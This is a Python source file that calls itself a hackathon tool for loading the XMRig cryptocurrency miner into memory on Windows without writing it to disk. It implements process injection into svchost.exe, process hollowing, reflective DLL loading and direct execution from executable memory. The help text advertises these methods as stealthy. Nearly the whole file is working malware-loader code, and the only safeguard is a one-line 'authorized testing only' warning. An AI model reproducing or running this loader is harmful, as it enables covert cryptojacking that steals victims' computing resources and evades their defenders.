#!/usr/bin/env python3
"""
In-Memory XMRig Loader - OSCP Hackathon 2025
Purpose: Load and execute XMRig entirely in memory without touching disk
Author: OSCP Hackathon Team
Usage: python3 stealth_loader.py --binary xmrig.exe --config config.json [--method injection|hollowing|reflective]

WARNING: For authorized testing only!
"""

import sys
import os
import argparse
import ctypes
from ctypes import wintypes
import struct
import subprocess
from pathlib import Path

# Check if running on Windows
try:
    import pefile
    PE_AVAILABLE = True
except ImportError:
    PE_AVAILABLE = False
    print("[!] pefile not installed - some features unavailable")
    print("    Install: pip install pefile")

class StealthLoader:
    """
    In-memory XMRig loader with multiple execution methods
    """

    def __init__(self, xmrig_binary, config_data=None):
        self.xmrig_data = Path(xmrig_binary).read_bytes()
        self.config_data = config_data

        # Windows-specific initialization
        if sys.platform == 'win32':
            self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            self.ntdll = ctypes.WinDLL('ntdll')
            self.is_windows = True
        else:
            self.is_windows = False
            print("[!] Not running on Windows - limited functionality")

        self.stats = {
            'binary_size': len(self.xmrig_data),
            'method': None,
            'process_id': None,
            'success': False
        }

    # ====================================================================
    # METHOD 1: PROCESS INJECTION
    # ====================================================================

    def inject_into_process(self, target_process_name="svchost.exe"):
        """
        Inject XMRig into legitimate process

        Steps:
        1. Find target process (svchost.exe, explorer.exe, etc.)
        2. Open process with full access
        3. Allocate memory in target
        4. Write XMRig binary
        5. Create remote thread to execute
        """

        if not self.is_windows:
            print("[-] Process injection only supported on Windows")
            return False

        print(f"\n[*] Process Injection Method")
        print(f"[*] Target: {target_process_name}")

        # Find target process
        target_pid = self._find_process(target_process_name)
        if not target_pid:
            print(f"[-] Process {target_process_name} not found")
            return False

        print(f"[+] Found {target_process_name} (PID: {target_pid})")

        # Open target process
        PROCESS_ALL_ACCESS = 0x1F0FFF
        hProcess = self.kernel32.OpenProcess(
            PROCESS_ALL_ACCESS,
            False,
            target_pid
        )

        if not hProcess:
            print(f"[-] Failed to open process: {ctypes.get_last_error()}")
            return False

        print(f"[+] Opened process handle: 0x{hProcess:X}")

        # Allocate memory in target
        print(f"[*] Allocating {len(self.xmrig_data)} bytes in target process...")

        remote_memory = self.kernel32.VirtualAllocEx(
            hProcess,
            None,
            len(self.xmrig_data),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )

        if not remote_memory:
            print(f"[-] Memory allocation failed: {ctypes.get_last_error()}")
            self.kernel32.CloseHandle(hProcess)
            return False

        print(f"[+] Allocated memory at: 0x{remote_memory:X}")

        # Write XMRig to target
        print(f"[*] Writing XMRig binary to target process...")

        bytes_written = ctypes.c_size_t()
        result = self.kernel32.WriteProcessMemory(
            hProcess,
            remote_memory,
            self.xmrig_data,
            len(self.xmrig_data),
            ctypes.byref(bytes_written)
        )

        if not result:
            print(f"[-] Write failed: {ctypes.get_last_error()}")
            self.kernel32.CloseHandle(hProcess)
            return False

        print(f"[+] Wrote {bytes_written.value} bytes")

        # Parse PE and find entry point
        if PE_AVAILABLE:
            try:
                pe = pefile.PE(data=self.xmrig_data)
                entry_point_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                entry_point = remote_memory + entry_point_rva
                print(f"[+] Entry point RVA: 0x{entry_point_rva:X}")
                print(f"[+] Entry point address: 0x{entry_point:X}")
            except Exception as e:
                print(f"[-] PE parsing failed: {e}")
                entry_point = remote_memory
        else:
            entry_point = remote_memory

        # Create remote thread
        print(f"[*] Creating remote thread at entry point...")

        hThread = self.kernel32.CreateRemoteThread(
            hProcess,
            None,
            0,
            entry_point,
            None,
            0,
            None
        )

        if not hThread:
            print(f"[-] Thread creation failed: {ctypes.get_last_error()}")
            self.kernel32.CloseHandle(hProcess)
            return False

        print(f"[+] Thread created: 0x{hThread:X}")
        print(f"[+] XMRig injected successfully!")

        # Cleanup
        self.kernel32.CloseHandle(hThread)
        self.kernel32.CloseHandle(hProcess)

        self.stats['method'] = 'injection'
        self.stats['process_id'] = target_pid
        self.stats['success'] = True

        return True

    # ====================================================================
    # METHOD 2: PROCESS HOLLOWING
    # ====================================================================

    def hollow_process(self, target_binary="C:\\Windows\\System32\\svchost.exe"):
        """
        Process hollowing technique

        Steps:
        1. Create suspended legitimate process
        2. Unmap original image
        3. Allocate memory for XMRig
        4. Write XMRig to new memory
        5. Update entry point
        6. Resume process
        """

        if not self.is_windows:
            print("[-] Process hollowing only supported on Windows")
            return False

        print(f"\n[*] Process Hollowing Method")
        print(f"[*] Target binary: {target_binary}")

        # Create suspended process
        print(f"[*] Creating suspended process...")

        startup_info = STARTUPINFOW()
        process_info = PROCESS_INFORMATION()

        startup_info.cb = ctypes.sizeof(STARTUPINFOW)

        result = self.kernel32.CreateProcessW(
            target_binary,
            None,
            None,
            None,
            False,
            0x00000004,  # CREATE_SUSPENDED
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        )

        if not result:
            print(f"[-] CreateProcess failed: {ctypes.get_last_error()}")
            return False

        print(f"[+] Process created (PID: {process_info.dwProcessId})")
        print(f"[+] Thread ID: {process_info.dwThreadId}")

        # Get process context
        context = CONTEXT()
        context.ContextFlags = 0x10007  # CONTEXT_FULL

        result = self.kernel32.GetThreadContext(
            process_info.hThread,
            ctypes.byref(context)
        )

        if not result:
            print(f"[-] GetThreadContext failed: {ctypes.get_last_error()}")
            self._terminate_process(process_info.hProcess)
            return False

        # Read PEB to get image base
        peb_offset = context.Rdx  # x64: PEB is in RDX
        image_base_addr = peb_offset + 0x10  # ImageBaseAddress offset in PEB

        image_base = ctypes.c_ulonglong()
        bytes_read = ctypes.c_size_t()

        self.kernel32.ReadProcessMemory(
            process_info.hProcess,
            image_base_addr,
            ctypes.byref(image_base),
            8,
            ctypes.byref(bytes_read)
        )

        print(f"[+] Original image base: 0x{image_base.value:X}")

        # Unmap original image
        print(f"[*] Unmapping original image...")

        self.ntdll.NtUnmapViewOfSection(
            process_info.hProcess,
            image_base.value
        )

        print(f"[+] Original image unmapped")

        # Parse XMRig PE
        if not PE_AVAILABLE:
            print("[-] pefile required for process hollowing")
            self._terminate_process(process_info.hProcess)
            return False

        try:
            pe = pefile.PE(data=self.xmrig_data)
        except Exception as e:
            print(f"[-] PE parsing failed: {e}")
            self._terminate_process(process_info.hProcess)
            return False

        # Allocate memory for XMRig
        image_size = pe.OPTIONAL_HEADER.SizeOfImage
        print(f"[*] Allocating {image_size} bytes for XMRig...")

        new_image_base = self.kernel32.VirtualAllocEx(
            process_info.hProcess,
            image_base.value,
            image_size,
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )

        if not new_image_base:
            print(f"[-] VirtualAllocEx failed: {ctypes.get_last_error()}")
            self._terminate_process(process_info.hProcess)
            return False

        print(f"[+] Allocated at: 0x{new_image_base:X}")

        # Write PE headers
        print(f"[*] Writing PE headers...")

        headers_size = pe.OPTIONAL_HEADER.SizeOfHeaders
        bytes_written = ctypes.c_size_t()

        self.kernel32.WriteProcessMemory(
            process_info.hProcess,
            new_image_base,
            self.xmrig_data[:headers_size],
            headers_size,
            ctypes.byref(bytes_written)
        )

        print(f"[+] Wrote {bytes_written.value} bytes (headers)")

        # Write sections
        print(f"[*] Writing sections...")

        for section in pe.sections:
            section_name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
            print(f"    Writing {section_name}...")

            section_data = section.get_data()
            section_addr = new_image_base + section.VirtualAddress

            self.kernel32.WriteProcessMemory(
                process_info.hProcess,
                section_addr,
                section_data,
                len(section_data),
                ctypes.byref(bytes_written)
            )

        print(f"[+] All sections written")

        # Update entry point in context
        entry_point = new_image_base + pe.OPTIONAL_HEADER.AddressOfEntryPoint
        context.Rcx = entry_point

        print(f"[*] Updating entry point to: 0x{entry_point:X}")

        result = self.kernel32.SetThreadContext(
            process_info.hThread,
            ctypes.byref(context)
        )

        if not result:
            print(f"[-] SetThreadContext failed: {ctypes.get_last_error()}")
            self._terminate_process(process_info.hProcess)
            return False

        # Resume process
        print(f"[*] Resuming process...")

        self.kernel32.ResumeThread(process_info.hThread)

        print(f"[+] Process hollowing complete!")
        print(f"[+] XMRig running as {target_binary}")

        # Cleanup handles
        self.kernel32.CloseHandle(process_info.hThread)
        self.kernel32.CloseHandle(process_info.hProcess)

        self.stats['method'] = 'hollowing'
        self.stats['process_id'] = process_info.dwProcessId
        self.stats['success'] = True

        return True

    # ====================================================================
    # METHOD 3: REFLECTIVE DLL INJECTION
    # ====================================================================

    def reflective_load(self):
        """
        Reflective DLL injection (requires XMRig as DLL)

        Steps:
        1. Load XMRig DLL into memory
        2. Parse PE headers
        3. Allocate memory and copy sections
        4. Process relocations
        5. Resolve imports
        6. Call entry point
        """

        if not self.is_windows:
            print("[-] Reflective loading only supported on Windows")
            return False

        print(f"\n[*] Reflective DLL Injection Method")

        if not PE_AVAILABLE:
            print("[-] pefile required for reflective loading")
            return False

        try:
            pe = pefile.PE(data=self.xmrig_data)
        except Exception as e:
            print(f"[-] PE parsing failed: {e}")
            return False

        # Verify it's a DLL
        if not (pe.FILE_HEADER.Characteristics & 0x2000):
            print("[-] Binary is not a DLL")
            return False

        print(f"[+] Valid DLL detected")

        # Allocate memory for DLL
        image_size = pe.OPTIONAL_HEADER.SizeOfImage
        print(f"[*] Allocating {image_size} bytes...")

        dll_base = self.kernel32.VirtualAlloc(
            None,
            image_size,
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )

        if not dll_base:
            print(f"[-] VirtualAlloc failed: {ctypes.get_last_error()}")
            return False

        print(f"[+] Allocated at: 0x{dll_base:X}")

        # Copy headers
        headers_size = pe.OPTIONAL_HEADER.SizeOfHeaders
        ctypes.memmove(dll_base, self.xmrig_data, headers_size)

        print(f"[+] Copied headers ({headers_size} bytes)")

        # Copy sections
        print(f"[*] Copying sections...")

        for section in pe.sections:
            section_name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
            section_data = section.get_data()
            section_addr = dll_base + section.VirtualAddress

            print(f"    {section_name}: 0x{section.VirtualAddress:X} ({len(section_data)} bytes)")

            ctypes.memmove(section_addr, section_data, len(section_data))

        # Process relocations
        print(f"[*] Processing relocations...")

        delta = dll_base - pe.OPTIONAL_HEADER.ImageBase

        if delta != 0 and hasattr(pe, 'DIRECTORY_ENTRY_BASERELOC'):
            for reloc in pe.DIRECTORY_ENTRY_BASERELOC:
                for entry in reloc.entries:
                    if entry.type == 10:  # IMAGE_REL_BASED_DIR64
                        reloc_addr = dll_base + reloc.struct.VirtualAddress + entry.rva

                        # Read current value
                        current_value = ctypes.c_ulonglong()
                        ctypes.memmove(
                            ctypes.byref(current_value),
                            reloc_addr,
                            8
                        )

                        # Apply delta
                        new_value = current_value.value + delta

                        # Write new value
                        ctypes.memmove(
                            reloc_addr,
                            ctypes.byref(ctypes.c_ulonglong(new_value)),
                            8
                        )

            print(f"[+] Relocations processed (delta: 0x{delta:X})")
        else:
            print(f"[+] No relocations needed")

        # Resolve imports
        print(f"[*] Resolving imports...")

        if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                dll_name = entry.dll.decode('utf-8')
                print(f"    Loading {dll_name}...")

                import_dll = self.kernel32.LoadLibraryA(dll_name.encode())

                if not import_dll:
                    print(f"    [-] Failed to load {dll_name}")
                    continue

                for imp in entry.imports:
                    if imp.name:
                        func_name = imp.name.decode('utf-8')
                    else:
                        func_name = f"Ordinal_{imp.ordinal}"

                    func_addr = self.kernel32.GetProcAddress(
                        import_dll,
                        imp.name if imp.name else imp.ordinal
                    )

                    if func_addr:
                        # Write function address to IAT
                        iat_entry = dll_base + imp.address
                        ctypes.memmove(
                            iat_entry,
                            ctypes.byref(ctypes.c_ulonglong(func_addr)),
                            8
                        )

        print(f"[+] Imports resolved")

        # Call DllMain
        entry_point = dll_base + pe.OPTIONAL_HEADER.AddressOfEntryPoint
        print(f"[*] Calling DllMain at: 0x{entry_point:X}")

        # Define DllMain prototype
        DLL_PROCESS_ATTACH = 1
        DllMainProto = ctypes.WINFUNCTYPE(
            wintypes.BOOL,
            wintypes.HINSTANCE,
            wintypes.DWORD,
            wintypes.LPVOID
        )

        dll_main = DllMainProto(entry_point)

        result = dll_main(dll_base, DLL_PROCESS_ATTACH, None)

        if result:
            print(f"[+] DllMain executed successfully")
            print(f"[+] XMRig loaded reflectively!")

            self.stats['method'] = 'reflective'
            self.stats['success'] = True

            return True
        else:
            print(f"[-] DllMain failed")
            return False

    # ====================================================================
    # METHOD 4: DIRECT MEMORY EXECUTION
    # ====================================================================

    def execute_direct(self):
        """
        Direct memory execution (simplest method)

        Steps:
        1. Allocate RWX memory
        2. Copy XMRig
        3. Execute from memory
        """

        if not self.is_windows:
            print("[-] Direct execution only supported on Windows")
            return False

        print(f"\n[*] Direct Memory Execution Method")

        # Allocate executable memory
        print(f"[*] Allocating {len(self.xmrig_data)} bytes...")

        memory = self.kernel32.VirtualAlloc(
            None,
            len(self.xmrig_data),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )

        if not memory:
            print(f"[-] VirtualAlloc failed: {ctypes.get_last_error()}")
            return False

        print(f"[+] Allocated at: 0x{memory:X}")

        # Copy XMRig to memory
        print(f"[*] Copying XMRig binary...")

        ctypes.memmove(memory, self.xmrig_data, len(self.xmrig_data))

        print(f"[+] Binary copied")

        # Parse PE and find entry point
        if PE_AVAILABLE:
            try:
                pe = pefile.PE(data=self.xmrig_data)
                entry_point_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                entry_point = memory + entry_point_rva
                print(f"[+] Entry point: 0x{entry_point:X}")
            except Exception as e:
                print(f"[-] PE parsing failed: {e}")
                entry_point = memory
        else:
            entry_point = memory

        # Create thread to execute
        print(f"[*] Creating execution thread...")

        hThread = self.kernel32.CreateThread(
            None,
            0,
            entry_point,
            None,
            0,
            None
        )

        if not hThread:
            print(f"[-] CreateThread failed: {ctypes.get_last_error()}")
            return False

        print(f"[+] Thread created: 0x{hThread:X}")
        print(f"[+] XMRig executing from memory!")

        self.kernel32.CloseHandle(hThread)

        self.stats['method'] = 'direct'
        self.stats['success'] = True

        return True

    # ====================================================================
    # HELPER FUNCTIONS
    # ====================================================================

    def _find_process(self, process_name):
        """Find process ID by name"""
        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name.lower():
                    return proc.info['pid']
        except ImportError:
            print("[!] psutil not installed - cannot find process")
            print("    Install: pip install psutil")

        return None

    def _terminate_process(self, hProcess):
        """Terminate process and cleanup"""
        self.kernel32.TerminateProcess(hProcess, 1)
        self.kernel32.CloseHandle(hProcess)

    def print_stats(self):
        """Print loader statistics"""
        print("\n" + "=" * 60)
        print(" Stealth Loader Statistics")
        print("=" * 60)
        print(f"  Binary Size:    {self.stats['binary_size']:,} bytes")
        print(f"  Method:         {self.stats['method'] or 'N/A'}")
        print(f"  Process ID:     {self.stats['process_id'] or 'N/A'}")
        print(f"  Success:        {self.stats['success']}")
        print("=" * 60)

# ========================================================================
# WINDOWS STRUCTURES
# ========================================================================

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ('cb', wintypes.DWORD),
        ('lpReserved', wintypes.LPWSTR),
        ('lpDesktop', wintypes.LPWSTR),
        ('lpTitle', wintypes.LPWSTR),
        ('dwX', wintypes.DWORD),
        ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD),
        ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD),
        ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD),
        ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD),
        ('cbReserved2', wintypes.WORD),
        ('lpReserved2', ctypes.POINTER(wintypes.BYTE)),
        ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE),
        ('hStdError', wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD),
    ]

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ('P1Home', ctypes.c_ulonglong),
        ('P2Home', ctypes.c_ulonglong),
        ('P3Home', ctypes.c_ulonglong),
        ('P4Home', ctypes.c_ulonglong),
        ('P5Home', ctypes.c_ulonglong),
        ('P6Home', ctypes.c_ulonglong),
        ('ContextFlags', wintypes.DWORD),
        ('MxCsr', wintypes.DWORD),
        ('SegCs', wintypes.WORD),
        ('SegDs', wintypes.WORD),
        ('SegEs', wintypes.WORD),
        ('SegFs', wintypes.WORD),
        ('SegGs', wintypes.WORD),
        ('SegSs', wintypes.WORD),
        ('EFlags', wintypes.DWORD),
        ('Dr0', ctypes.c_ulonglong),
        ('Dr1', ctypes.c_ulonglong),
        ('Dr2', ctypes.c_ulonglong),
        ('Dr3', ctypes.c_ulonglong),
        ('Dr6', ctypes.c_ulonglong),
        ('Dr7', ctypes.c_ulonglong),
        ('Rax', ctypes.c_ulonglong),
        ('Rcx', ctypes.c_ulonglong),
        ('Rdx', ctypes.c_ulonglong),
        ('Rbx', ctypes.c_ulonglong),
        ('Rsp', ctypes.c_ulonglong),
        ('Rbp', ctypes.c_ulonglong),
        ('Rsi', ctypes.c_ulonglong),
        ('Rdi', ctypes.c_ulonglong),
        ('R8', ctypes.c_ulonglong),
        ('R9', ctypes.c_ulonglong),
        ('R10', ctypes.c_ulonglong),
        ('R11', ctypes.c_ulonglong),
        ('R12', ctypes.c_ulonglong),
        ('R13', ctypes.c_ulonglong),
        ('R14', ctypes.c_ulonglong),
        ('R15', ctypes.c_ulonglong),
        ('Rip', ctypes.c_ulonglong),
    ]

# ========================================================================
# MAIN
# ========================================================================

def main():
    parser = argparse.ArgumentParser(
        description='In-Memory XMRig Loader - Stealth Execution',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Execution Methods:
  injection   - Inject into existing process (stealth)
  hollowing   - Process hollowing (very stealth)
  reflective  - Reflective DLL injection (requires DLL)
  direct      - Direct memory execution (simple)

Examples:
  # Inject into svchost.exe
  python3 stealth_loader.py --binary xmrig.exe --method injection

  # Process hollowing
  python3 stealth_loader.py --binary xmrig.exe --method hollowing

  # Direct execution
  python3 stealth_loader.py --binary xmrig.exe --method direct

Requirements:
  - Windows OS
  - pip install pefile psutil

WARNING: For authorized testing only!
        '''
    )

    parser.add_argument('--binary', required=True,
                        help='XMRig binary path')
    parser.add_argument('--config',
                        help='XMRig config.json path')
    parser.add_argument('--method', default='injection',
                        choices=['injection', 'hollowing', 'reflective', 'direct'],
                        help='Execution method (default: injection)')
    parser.add_argument('--target-process', default='svchost.exe',
                        help='Target process for injection (default: svchost.exe)')
    parser.add_argument('--target-binary', default='C:\\Windows\\System32\\svchost.exe',
                        help='Target binary for hollowing')
    parser.add_argument('--quiet', action='store_true',
                        help='Minimal output')

    args = parser.parse_args()

    # Verify binary exists
    if not Path(args.binary).exists():
        print(f"[-] Binary not found: {args.binary}")
        sys.exit(1)

    # Load config if provided
    config_data = None
    if args.config:
        if Path(args.config).exists():
            config_data = Path(args.config).read_bytes()
        else:
            print(f"[!] Config not found: {args.config}")

    # Banner
    if not args.quiet:
        print("\n╔" + "═" * 58 + "╗")
        print("║" + " In-Memory XMRig Loader - OSCP Hackathon 2025 ".center(58) + "║")
        print("╚" + "═" * 58 + "╝\n")

    # Check Windows
    if sys.platform != 'win32':
        print("[-] ERROR: This tool requires Windows")
        sys.exit(1)

    # Check dependencies
    if not PE_AVAILABLE and args.method in ['hollowing', 'reflective']:
        print(f"[-] ERROR: {args.method} method requires pefile")
        print("    Install: pip install pefile")
        sys.exit(1)

    # Create loader
    loader = StealthLoader(args.binary, config_data)

    # Execute with chosen method
    print(f"[*] Using {args.method} method\n")

    success = False

    try:
        if args.method == 'injection':
            success = loader.inject_into_process(args.target_process)
        elif args.method == 'hollowing':
            success = loader.hollow_process(args.target_binary)
        elif args.method == 'reflective':
            success = loader.reflective_load()
        elif args.method == 'direct':
            success = loader.execute_direct()
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        success = False

    # Print stats
    if not args.quiet:
        loader.print_stats()

    if success:
        print("\n[+] XMRig loaded successfully!")
        sys.exit(0)
    else:
        print("\n[-] Loading failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
